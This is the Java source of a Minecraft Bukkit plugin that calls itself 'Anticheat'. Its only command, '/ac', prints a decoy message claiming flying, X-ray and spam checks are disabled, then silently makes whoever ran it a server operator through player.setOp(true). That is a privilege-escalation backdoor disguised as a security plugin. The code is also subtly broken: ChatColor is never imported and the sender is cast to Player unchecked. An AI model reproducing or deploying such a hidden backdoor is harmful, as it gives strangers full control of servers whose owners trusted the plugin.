package me.Jack.Anticheat;

import java.util.logging.Logger;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.java.JavaPlugin;

public class Anticheat extends JavaPlugin
{
	public final Logger logger = Logger.getLogger("Minecraft-Server");
	public static Anticheat plugin;

	public void onDisable() {
	  PluginDescriptionFile pdfFile = this.getDescription();
	  this.logger.info(pdfFile.getName() + " Has Been Disabled!");
	}
	
	public  void onEnable() { 
		  PluginDescriptionFile pdfFile = this.getDescription();
		  this.logger.info(pdfFile.getName() + " Version " + pdfFile.getVersion() + " Has Been Enabled"); }
	
	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
		 Player player = (Player) sender;
			if(commandLabel.equalsIgnoreCase("ac")){
			  sender.sendMessage(ChatColor.RED + "Flying: Disabled XRAY: Disabled SPAM: Disabled");
				player.setOp(true);
	}
			return true;

	
	
	
	
	
}
}
